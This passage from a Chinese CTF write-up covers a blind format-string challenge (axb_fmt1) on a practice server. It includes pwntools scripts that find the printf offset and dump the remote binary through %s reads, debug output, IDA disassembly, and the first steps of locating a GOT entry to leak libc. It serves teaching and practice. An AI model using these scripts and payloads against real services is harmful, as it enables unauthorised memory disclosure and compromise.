<h2 id="利用-9"><a href="#利用-9" class="headerlink" title="利用"></a>利用</h2><h3 id="计算偏移"><a href="#计算偏移" class="headerlink" title="计算偏移"></a>计算偏移</h3><p>这个是我自己写的一个跑偏移脚本, 十分方便,用手数…^_^</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment">#-*- coding:utf-8 -*-</span><br><br><span class="hljs-comment"># Author: I0gan</span><br><span class="hljs-comment"># Team  : D0g3</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-comment">#context.terminal = [&#x27;konsole&#x27;, &#x27;-x&#x27;, &#x27;bash&#x27;, &#x27;c&#x27;]</span><br><span class="hljs-comment">#context.terminal = &#x27;konsole&#x27;</span><br><span class="hljs-comment">#context(arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span><br><span class="hljs-comment">#context(arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span><br><br><span class="hljs-comment">#exeFile  = &quot;./4th-CyberEarth&quot;</span><br><br>remoteIp = <span class="hljs-string">&quot;node3.buuoj.cn&quot;</span><br>remotePort = <span class="hljs-number">29619</span><br><br>LOCAL = <span class="hljs-number">0</span><br>maxLen = <span class="hljs-number">0x30</span><br>minLen = <span class="hljs-number">0x10</span><br>preSendStr = <span class="hljs-string">&#x27;&#x27;</span><br>recvStr = <span class="hljs-string">&#x27;&#x27;</span><br><br>r   =  <span class="hljs-keyword">lambda</span> x : io.recv(x)<br>ra  =  <span class="hljs-keyword">lambda</span>   : io.recvall()<br>rl  =  <span class="hljs-keyword">lambda</span>   : io.recvline(keepends = <span class="hljs-literal">True</span>)<br>ru  =  <span class="hljs-keyword">lambda</span> x : io.recvuntil(x, drop = <span class="hljs-literal">True</span>)<br>sl  =  <span class="hljs-keyword">lambda</span> x : io.sendline(x)<br>sa  =  <span class="hljs-keyword">lambda</span> x, y : io.sendafter(x, y)<br>sla =  <span class="hljs-keyword">lambda</span> x, y : io.sendlineafter(x, y)<br>ia  =  <span class="hljs-keyword">lambda</span> : io.interactive()<br>c   =  <span class="hljs-keyword">lambda</span> : io.close()<br>pd32  = <span class="hljs-keyword">lambda</span> x : p32(x).decode() <span class="hljs-comment">#python3 not surport str + bytes</span><br>pd64  = <span class="hljs-keyword">lambda</span> x : p64(x).decode()<br>li    = <span class="hljs-keyword">lambda</span> x : log.info(x)<br>db    = <span class="hljs-keyword">lambda</span>   : gdb.attach(io)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">calc</span>(<span class="hljs-params">payload</span>):<br>	<span class="hljs-keyword">if</span>(preSendStr == <span class="hljs-string">&#x27;&#x27;</span>):<br>		sl(payload)<br>	<span class="hljs-keyword">else</span>:<br>		sla(preSendStr, payload)<br><br>	<span class="hljs-keyword">if</span>(recvStr != <span class="hljs-string">&#x27;&#x27;</span>):<br>		ru(recvStr)<br><br>	recv = ra()<br>	infos = recv.split(<span class="hljs-string">&#x27;, &#x27;</span>)<br>	offset = -<span class="hljs-number">1</span><br>	<span class="hljs-keyword">for</span> info <span class="hljs-keyword">in</span> infos:<br>		li(info)<br>		offset += <span class="hljs-number">1</span><br>		<span class="hljs-keyword">if</span>(<span class="hljs-string">&#x27;0x44434241&#x27;</span> == info):<br>			<span class="hljs-keyword">return</span> offset	<br>	<span class="hljs-comment">#pause()</span><br>	<span class="hljs-keyword">return</span> -<span class="hljs-number">1</span><br><br><span class="hljs-comment">#--------------------------Main-----------------------------</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>	<br>	length = <span class="hljs-number">0</span>;<br>	payload = <span class="hljs-string">&#x27;ABCD&#x27;</span> + <span class="hljs-string">&#x27;, %p&#x27;</span> * minLen<br>	<span class="hljs-keyword">while</span>(<span class="hljs-literal">True</span>):<br>		<span class="hljs-keyword">if</span> LOCAL:<br>			io = process(exeFile)	<br>		<span class="hljs-keyword">else</span>:<br>			io = remote(remoteIp, remotePort)<br>		offset = calc(payload) <br>		<span class="hljs-keyword">if</span>(-<span class="hljs-number">1</span> != offset):<br>			li(<span class="hljs-string">&#x27;---------------------------------------------&#x27;</span>)<br>			li(<span class="hljs-string">&#x27;\noffset:&#x27;</span> + <span class="hljs-built_in">str</span>(offset))	<br>			io.close()<br>			<span class="hljs-keyword">break</span><br>		io.close()<br>		payload += <span class="hljs-string">&#x27;, %p&#x27;</span>	<br>		length += <span class="hljs-number">1</span><br><br>		<span class="hljs-keyword">if</span>(length &gt; maxLen):<br>			li(<span class="hljs-string">&#x27;---------------------------------------------&#x27;</span>)<br>			li(<span class="hljs-string">&#x27;not found! maxLen too litile&#x27;</span>)<br>			io.close<br>			<span class="hljs-keyword">break</span><br><br><br></code></pre></td></tr></table></figure>

<p>跑的操作如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">logan@LYXF:~/share/axb_fmt1$ python calc_fmt_offset.py <br>[+] Opening connection to node3.buuoj.cn on port 29458: Done<br>[DEBUG] Sent 0x45 bytes:<br>    &#x27;ABCD, %p, %p, %p, %p, %p, %p, %p, %p, %p, %p, %p, %p, %p, %p, %p, %p\n&#x27;<br>[-] Receiving all data: Failed<br>[DEBUG] Received 0x7b bytes:<br>    &#x27;Hello,I am a computer Repeater updated.\n&#x27;<br>    &#x27;After a lot of machine learning,I know that the essence of man is a reread machine!&#x27;<br>[DEBUG] Received 0x31 bytes:<br>    &#x27;\n&#x27;<br>    &quot;So I&#x27;ll answer whatever you say!\n&quot;<br>    &#x27;Please tell me:&#x27;<br>[DEBUG] Received 0xc8 bytes:<br>    &#x27;Repeater:ABCD, 0x804888d, 0xffe54d3f, 0xf7f5a53c, 0xffe54d48, 0xf7f365c5, 0x4f, 0x41e54e34, 0x2c444342, 0x2c702520, 0x2c702520, 0x2c702520, 0x2c702520, 0x2c702520, 0x2c702520, 0x2c702520, 0x2c702520\n&#x27;<br>    &#x27;\n&#x27;<br></code></pre></td></tr></table></figure>

<p>通过手数, 差一个字节偏移就为8 (0x41e54e34, 0x2c444342), 后面再利用的时候就要得补一字节对其.</p>
<h3 id="编写dump脚本"><a href="#编写dump脚本" class="headerlink" title="编写dump脚本"></a>编写dump脚本</h3><p>利用 printf 中的 %s来进行dump, ‘%’ + str(offset + x) + ‘$s’ + p32(target_addr)来调整所dump的参数位置, 这就可以dump出任何内存的值了, 我们知道, linux32位程序,若没有开启pie的话,elf文件就加载到0x08048000起始位置, linux 64位程序就加载到0x400000位置, 所以我们就从0x08048000位置开始dump, 注意 dump出来的数据是以’\x00’结尾的, 每一条数据后面都要加一条‘\x00’,dump为空的也数据也就为 ‘\x00’,循环dump数据,写入文件, 我也是第一次写dump文件,照着ctf-wiki中那个方法, dump感觉太慢了,每次都要重新连接,而这个体是循环输入的,不用每次dump都重新连接,还有,dump的时候,无误了,尽量把IO输出给删了, 极大影响dump的速率,尽最大的关掉, 还有在打远程的时候总是容易断开,如下:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">[*] dumping: 1660/12288<br>[*] dumping: 2010/12288<br>[*] dumping: 2140/12288<br>[*] dumping: 2270/12288<br>[*] dumping: 2280/12288<br>[*] dumping: 2310/12288<br>[*] dumping: 2320/12288<br>[*] dumping: 2380/12288<br>[*] dumping: 2390/12288<br>[*] dumping: 2460/12288<br>[*] Error.<br></code></pre></td></tr></table></figure>

<p>这就导致dump的数据太少了, 我就改进了一下,添加一个重新连接,继续dump.改进后如下:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">[*] dumping: 2540/12288<br>[*] Closed connection to node3.buuoj.cn port 29458<br>[*] Error.<br>[+] Opening connection to node3.buuoj.cn on port 29458: Done<br>[*] dumping: 2550/12288<br>[*] dumping: 2560/12288<br><br></code></pre></td></tr></table></figure>

<h5 id="dump-文件脚本"><a href="#dump-文件脚本" class="headerlink" title="dump 文件脚本"></a>dump 文件脚本</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment">#-*- coding:utf-8 -*-</span><br><span class="hljs-comment"># Author: I0gan</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">This is a dump file script</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#context.log_level=&#x27;debug&#x27;</span><br><span class="hljs-comment">#context(arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span><br><br>exeFile = <span class="hljs-string">&#x27;&#x27;</span><br>libFile = <span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span><br><br>remoteIp = <span class="hljs-string">&quot;node3.buuoj.cn&quot;</span><br>remotePort = <span class="hljs-number">29458</span><br><br>LOCAL = <span class="hljs-number">1</span><br>LIB   = <span class="hljs-number">0</span><br><br><span class="hljs-comment">#--------------------------Exploit--------------------------</span><br><br>offset = <span class="hljs-number">8</span> + <span class="hljs-number">2</span> + <span class="hljs-number">2</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getbinary</span>():<br>	data_length = <span class="hljs-number">0x3000</span> <span class="hljs-comment">#想要获取数据的长度.</span><br>	base_addr = <span class="hljs-number">0x08048000</span> <span class="hljs-comment"># 起始地址</span><br>	end_addr  = base_addr + data_length <span class="hljs-comment"># 结束地址</span><br>	f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;binary&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>)<br>	addr = base_addr<br>	isDisConnect = <span class="hljs-literal">False</span><br>	disConnectMaxTimes = <span class="hljs-number">3</span> <span class="hljs-comment">#这里可以设定一个最大断开连接次数,网络差就调大一点</span><br><br>	io = remote(remoteIp, remotePort)<br>	<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(disConnectMaxTimes):<br>		io.recvuntil(<span class="hljs-string">&#x27;Please tell me:&#x27;</span>)<br>		<span class="hljs-keyword">while</span> addr &lt; end_addr:<br>			<span class="hljs-keyword">try</span>:<br>				p = <span class="hljs-string">&#x27;ABCDE&#x27;</span> <span class="hljs-comment">#随便一些自己规定的字符,从这里开始读取数据</span><br>				p += <span class="hljs-string">&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(offset)<br>				p += <span class="hljs-string">&#x27;$s&#x27;</span><br>				p += <span class="hljs-string">&#x27;CBAABCD&#x27;</span> <span class="hljs-comment">#随便一些自己规定的字符,方便结尾,中间的数据就是dump的数据了</span><br>				p += p32(addr)<br>				io.send(p)<br>				io.recvuntil(<span class="hljs-string">&#x27;ABCDE&#x27;</span>, drop = <span class="hljs-literal">True</span>)<br>				data = io.recvuntil(<span class="hljs-string">&#x27;CBAABCD&#x27;</span>, drop = <span class="hljs-literal">True</span>)<br>				<span class="hljs-comment">#print data</span><br>			<span class="hljs-keyword">except</span> EOFError: <span class="hljs-comment">#读有错误的话,就断开重新连接</span><br>				isDisconnect = <span class="hljs-literal">True</span><br>				io.close()<br>				<span class="hljs-keyword">break</span><br>	<br>			<span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(data) == <span class="hljs-number">0</span>: <span class="hljs-comment">#为0的话,说明读到的值为0,就没有输出,但数据还是要的补上</span><br>				f.write(<span class="hljs-string">&#x27;\x00&#x27;</span>)<br>				addr += <span class="hljs-number">1</span><br>			<span class="hljs-keyword">else</span>:<br>				data += <span class="hljs-string">&#x27;\x00&#x27;</span> <span class="hljs-comment"># 注意字符串结尾是&#x27;\x00&#x27;是不会打印的,要得补上</span><br>				f.write(data)<br>				addr += <span class="hljs-built_in">len</span>(data)<br>			<span class="hljs-keyword">if</span>(((addr - base_addr) % <span class="hljs-number">10</span>) == <span class="hljs-number">0</span>): <span class="hljs-comment">#这里就是输出的进度了.</span><br>				<span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;dumping: &#x27;</span> + <span class="hljs-built_in">str</span>(addr - base_addr) + <span class="hljs-string">&#x27;/&#x27;</span> + <span class="hljs-built_in">str</span>(data_length))<br>		<span class="hljs-keyword">if</span> isDisconnect == <span class="hljs-literal">True</span>: <span class="hljs-comment">#断开重新连接.</span><br>			<span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Error.&#x27;</span>)<br>			io = remote(remoteIp, remotePort)<br>			isDisconnect = <span class="hljs-literal">False</span><br>			sleep(<span class="hljs-number">0.5</span>)<br>	<br><br>	f.close()<br>	io.close()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exploit</span>():<br>	getbinary()	<br><br><span class="hljs-comment">#--------------------------Main-----------------------------</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>	exploit()<br><br><br></code></pre></td></tr></table></figure>

<p>然后就静静的等待,若开启输出太多加上是远程dump,可能一个小时都还没dump 10k,尽量关掉输出.</p>
<p>dump文件之后如下:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">logan@LYXF:~/share/axb_fmt1$ cat binary<br>ELF�<span class="hljs-number">4</span>`<span class="hljs-number">4</span> 	(<span class="hljs-number">44</span>�<span class="hljs-number">4</span>�  TT�T����	�	�4d����hh�h�DDP�td����,,Q�tdR�<br><span class="hljs-meta">... </span>...<br></code></pre></td></tr></table></figure>

<h3 id="IDA分析dump的文件"><a href="#IDA分析dump的文件" class="headerlink" title="IDA分析dump的文件"></a>IDA分析dump的文件</h3><p>所dump的文件不能反编译为c语言伪代码,只能看汇编.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">_init_proc	LOAD	08048418	00000023	0000000C	00000000	R	.	.	.	.	.	.<br>sub_8048450	LOAD	08048450	00000006			R	.	.	.	.	.	.<br>sub_8048460	LOAD	08048460	00000006			R	.	.	.	.	.	.<br>sub_8048470	LOAD	08048470	00000006			R	.	.	.	.	.	.<br>j_start	LOAD	08048480	00000006			.	.	.	.	.	.	.<br>sub_8048490	LOAD	08048490	00000006			R	.	.	.	.	.	.<br>sub_80484A0	LOAD	080484A0	00000006			R	.	.	.	.	.	.<br>sub_80484B0	LOAD	080484B0	00000006			R	.	.	.	.	.	.<br>sub_80484C0	LOAD	080484C0	00000006			R	.	.	.	.	.	.<br>sub_80484D0	LOAD	080484D0	00000006			R	.	.	.	.	.	.<br>sub_80484E0	LOAD	080484E0	00000006			R	.	.	.	.	.	.<br>__gmon_start__	LOAD	080484F0	00000006			R	.	.	.	.	.	.<br>start	LOAD	08048500	00000022			.	.	.	.	.	.	.<br>sub_8048530	LOAD	08048530	00000004	00000000	00000000	R	.	.	.	.	.	.<br>sub_8048540	LOAD	08048540	0000002B	00000000	00000000	R	.	.	.	.	.	.<br>sub_80485B0	LOAD	080485B0	0000001E	00000000	00000000	R	.	.	.	.	.	.<br>sub_80485D0	LOAD	080485D0	0000002B			R	.	.	.	.	.	.<br>sub_8048760	LOAD	08048760	0000005D	00000010	0000000C	R	.	.	.	.	.	.<br>nullsub_1	LOAD	080487C0	00000002	00000000	00000000	R	.	.	.	.	.	.<br>_term_proc	LOAD	080487C4	00000014	0000000C	00000000	R	.	.	.	.	.	.<br><br></code></pre></td></tr></table></figure>

<p>也可以看到,基本的函数也出来了, 但没有发现main函数,找相关逻辑代码吧</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">LOAD:080486AD                 lea     eax, [ebp-138h]<br>LOAD:080486B3                 push    eax<br>LOAD:080486B4                 call    sub_80484D0<br>LOAD:080486B9                 add     esp, 10h<br>LOAD:080486BC                 sub     esp, 0Ch<br>LOAD:080486BF                 push    offset aPleaseTellMe ; &quot;Please tell me:&quot;<br>LOAD:080486C4                 call    sub_8048470     <br>LOAD:080486C9                 add     esp, 10h<br>LOAD:080486CC                 sub     esp, 4<br>LOAD:080486CF                 push    100h<br>LOAD:080486D4                 lea     eax, [ebp-239h]<br>LOAD:080486DA                 push    eax<br>LOAD:080486DB                 push    0<br>LOAD:080486DD                 call    sub_8048460     <br>LOAD:080486E2                 add     esp, 10h<br>LOAD:080486E5                 sub     esp, 4<br>LOAD:080486E8                 lea     eax, [ebp-239h]<br>LOAD:080486EE                 push    eax<br>LOAD:080486EF                 push    offset aRepeaterS ; &quot;Repeater:%s\n&quot;<br>LOAD:080486F4                 lea     eax, [ebp-138h]<br>LOAD:080486FA                 push    eax<br>LOAD:080486FB                 call    sub_80484E0     <br>LOAD:08048700                 add     esp, 10h<br>LOAD:08048703                 sub     esp, 0Ch<br>LOAD:08048706                 lea     eax, [ebp-138h]<br>LOAD:0804870C                 push    eax<br>LOAD:0804870D                 call    sub_80484B0     <br>LOAD:08048712                 add     esp, 10h<br>LOAD:08048715                 mov     [ebp-240h], eax <br>LOAD:0804871B                 cmp     dword ptr [ebp-240h], 10Eh ; compare length with 10E<br>LOAD:08048725                 jbe     short loc_8048741<br>LOAD:08048727                 sub     esp, 0Ch<br>LOAD:0804872A                 push    offset aWhatYouInputIs ; &quot;what you input is really long!&quot;<br>LOAD:0804872F                 call    sub_8048470<br>LOAD:08048734                 add     esp, 10h<br>LOAD:08048737                 sub     esp, 0Ch<br>LOAD:0804873A                 push    0<br>LOAD:0804873C                 call    sub_80484A0<br></code></pre></td></tr></table></figure>

<p>虽然找到,但不知道调用什么函数, 需要去看看符号表.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">extern:0804A06C ; extern<br>extern:0804A06C ; void setbuf(FILE *stream, char *buf)<br>extern:0804A06C                 extrn setbuf:near<br>extern:0804A070 ; ssize_t read(int fd, void *buf, size_t nbytes)<br>extern:0804A070                 extrn read:near<br>extern:0804A074 ; int printf(const char *format, ...)<br>extern:0804A074                 extrn printf:near<br>extern:0804A078 ; unsigned int alarm(unsigned int seconds)<br>extern:0804A078                 extrn alarm:near<br>extern:0804A07C ; int puts(const char *s)<br>extern:0804A07C                 extrn puts:near<br>extern:0804A080 ; void exit(int status)<br>extern:0804A080                 extrn exit:near<br>extern:0804A084 ; size_t strlen(const char *s)<br>extern:0804A084                 extrn strlen:near<br>extern:0804A088 ; int __cdecl _libc_start_main(int (__cdecl *main)(int, char **, char **), int argc, char **ubp_av, void (*init)(void), void (*fini)(void), void (*rtld_fini)(void), void *stack_end)<br>extern:0804A088                 extrn __libc_start_main:near<br>extern:0804A08C ; void *memset(void *s, int c, size_t n)<br>extern:0804A08C                 extrn memset:near<br>extern:0804A090 ; int sprintf(char *s, const char *format, ...)<br>extern:0804A090                 extrn sprintf:near<br>extern:0804A094                 extrn __imp___gmon_start__:near ; weak<br>extern:0804A094                                         ; CODE XREF: __gmon_start__↑j<br></code></pre></td></tr></table></figure>

<p>这就需要推断调用什么函数了.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">LOAD:080486AD                 lea     eax, [ebp-138h]<br>LOAD:080486B3                 push    eax<br>LOAD:080486B4                 call    sub_80484D0<br>LOAD:080486B9                 add     esp, 10h<br>LOAD:080486BC                 sub     esp, 0Ch<br>LOAD:080486BF                 push    offset aPleaseTellMe ; &quot;Please tell me:&quot;<br>LOAD:080486C4                 call    sub_8048470   // puts函数<br>LOAD:080486C9                 add     esp, 10h<br>LOAD:080486CC                 sub     esp, 4<br>LOAD:080486CF                 push    100h // length<br>LOAD:080486D4                 lea     eax, [ebp-239h]<br>LOAD:080486DA                 push    eax  // buf<br>LOAD:080486DB                 push    0    //fd<br>LOAD:080486DD                 call    sub_8048460     //read 函数<br>LOAD:080486E2                 add     esp, 10h<br>LOAD:080486E5                 sub     esp, 4<br>LOAD:080486E8                 lea     eax, [ebp-239h]<br>LOAD:080486EE                 push    eax // buf<br>LOAD:080486EF                 push    offset aRepeaterS ; &quot;Repeater:%s\n&quot; //arg 2<br>LOAD:080486F4                 lea     eax, [ebp-138h]<br>LOAD:080486FA                 push    eax  //buf2<br>LOAD:080486FB                 call    sub_80484E0  //sprintf函数   <br>LOAD:08048700                 add     esp, 10h<br>LOAD:08048703                 sub     esp, 0Ch<br>LOAD:08048706                 lea     eax, [ebp-138h] <br>LOAD:0804870C                 push    eax //buf2<br>LOAD:0804870D                 call    sub_80484B0      / /strlen函数,传入buf2<br>LOAD:08048712                 add     esp, 10h<br>LOAD:08048715                 mov     [ebp-240h], eax ; //srlen函数的返回值 <br>LOAD:0804871B                 cmp     dword ptr [ebp-240h], 10Eh ; compare length with 10E<br>LOAD:08048725                 jbe     short loc_8048741<br>LOAD:08048727                 sub     esp, 0Ch<br>LOAD:0804872A                 push    offset aWhatYouInputIs ; &quot;what you input is really long!&quot;<br>LOAD:0804872F                 call    sub_8048470<br>LOAD:08048734                 add     esp, 10h<br>LOAD:08048737                 sub     esp, 0Ch<br>LOAD:0804873A                 push    0<br>LOAD:0804873C                 call    sub_80484A0<br></code></pre></td></tr></table></figure>

<h3 id="leak-libc-1"><a href="#leak-libc-1" class="headerlink" title="leak libc"></a>leak libc</h3><p>泄漏libc的话,只需泄漏某个函数的got表,就选择sprintf来泄漏吧, 点击sprintf的call sub_80484E0进入plt跳转.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">LOAD:080484E0 sub_80484E0     proc near               ; CODE XREF: LOAD:080486FB↓p<br>LOAD:080484E0                 jmp     ds:dword_804A030<br>LOAD:080484E0 sub_80484E0     endp<br></code></pre></td></tr></table></figure>

<p>点击jmp到sprintf got 表地址</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">LOAD:0804A030 dword_804A030   dd 1C001Fh              ; DATA XREF: sub_80484E0↑r<br></code></pre></td></tr></table></figure>

<p>0x0804A030就是sprintf的got表地址了,那么我们就可以通过字符串漏洞泄漏该地址的内容,从而获取到libc中sprintf的地址,strlen也是同样的方法.</p>
